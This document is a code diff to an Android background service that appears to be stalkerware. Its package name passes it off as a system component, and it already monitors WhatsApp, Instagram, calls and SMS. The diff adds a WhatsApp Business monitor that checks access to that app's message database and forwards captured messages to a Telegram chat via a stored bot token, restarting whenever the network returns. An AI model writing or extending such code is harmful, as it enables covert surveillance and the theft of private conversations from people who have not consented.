@@ -56,6 +56,7 @@ class BotService : Service() {
     private var networkCallback: ConnectivityManager.NetworkCallback? = null
     private var pollingJob: Job? = null
     private var whatsAppMonitor: WhatsAppMonitor? = null
+    private var waBusinessMonitor: com.system.superiormonitor.monitor.WABusinessMonitor? = null
     private var instagramMonitor: InstagramMonitor? = null
     private var callMonitor: CallMonitor? = null
     private var smsMonitor: SmsMonitor? = null
@@ -93,6 +94,10 @@ class BotService : Service() {
         // ── Dynamic feature toggle actions (no need to restart whole service) ──
         if (action == "ACTION_UPDATE_WHATSAPP") {
             handleWhatsAppToggle()
+            return START_STICKY
+        }
+        if (action == "ACTION_UPDATE_WABUSINESS") {
+            handleWABusinessToggle()
             return START_STICKY
         }
         if (action == "ACTION_UPDATE_INSTAGRAM") {
@@ -144,6 +149,7 @@ class BotService : Service() {
 
         // Start monitors if enabled
         startWhatsAppMonitorIfEnabled()
+        startWABusinessMonitorIfEnabled()
         startInstagramMonitorIfEnabled()
         startCallMonitorIfEnabled()
         startSmsMonitorIfEnabled()
@@ -176,6 +182,19 @@ class BotService : Service() {
             whatsAppMonitor?.stop()
             whatsAppMonitor = null
             LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor dynamically stopped.")
+        }
+    }
+
+    private fun handleWABusinessToggle() {
+        if (prefsManager?.whatsappBusinessUpdatesEnabled == true) {
+            if (waBusinessMonitor == null) {
+                startWABusinessMonitorIfEnabled()
+                LogManager.log(LogCategory.SYSTEM, "WA Business Monitor dynamically started.")
+            }
+        } else {
+            waBusinessMonitor?.stop()
+            waBusinessMonitor = null
+            LogManager.log(LogCategory.SYSTEM, "WA Business Monitor dynamically stopped.")
         }
     }
 
@@ -331,6 +350,34 @@ class BotService : Service() {
         }
     }
 
+    private fun startWABusinessMonitorIfEnabled() {
+        if (prefsManager?.whatsappBusinessUpdatesEnabled == true) {
+            if (waBusinessMonitor == null) {
+                // Fail-safe: Verify WhatsApp Business is installed and database is accessible
+                if (!com.system.superiormonitor.monitor.WABusinessMonitor.isWhatsAppInstalled(this)) {
+                    LogManager.log(LogCategory.SYSTEM, "WA Business Monitor: WhatsApp Business is not installed. Disabling toggle.")
+                    prefsManager?.whatsappBusinessUpdatesEnabled = false
+                    return
+                }
+                val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.WABusinessMonitor.checkWhatsAppDatabase()
+                if (!dbAvailable) {
+                    LogManager.log(LogCategory.SYSTEM, "WA Business Monitor: $dbReason. Disabling toggle.")
+                    prefsManager?.whatsappBusinessUpdatesEnabled = false
+                    return
+                }
+
+                waBusinessMonitor = com.system.superiormonitor.monitor.WABusinessMonitor(this) { text, parseMode: String? ->
+                    val chatId = prefsManager?.chatId ?: return@WABusinessMonitor false
+                    val token = prefsManager?.botToken ?: return@WABusinessMonitor false
+                    val msgId = TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
+                    msgId != null
+                }
+                LogManager.log(LogCategory.SYSTEM, "WA Business Monitor initialized.")
+            }
+            waBusinessMonitor?.start(serviceScope)
+        }
+    }
+
     private fun startInstagramMonitorIfEnabled() {
         if (prefsManager?.instagramEnabled == true) {
             if (instagramMonitor == null) {
@@ -398,6 +445,7 @@ class BotService : Service() {
             override fun onAvailable(network: Network) {
                 // Instantly resume WhatsApp Monitor to catch the reconnect message flood
                 startWhatsAppMonitorIfEnabled()
+                startWABusinessMonitorIfEnabled()
                 startInstagramMonitorIfEnabled()
 
                 if (pollingJob?.isActive != true) {
@@ -441,6 +489,7 @@ class BotService : Service() {
                 
                 // Suspend WhatsApp Monitor to save battery
                 whatsAppMonitor?.stop()
+                waBusinessMonitor?.stop()
                 instagramMonitor?.stop()
 
                 pollingJob?.cancel()
@@ -620,6 +669,8 @@ class BotService : Service() {
         super.onDestroy()
         whatsAppMonitor?.stop()
         whatsAppMonitor = null
+        waBusinessMonitor?.stop()
+        waBusinessMonitor = null
         instagramMonitor?.stop()
         instagramMonitor = null
         callMonitor?.stop()
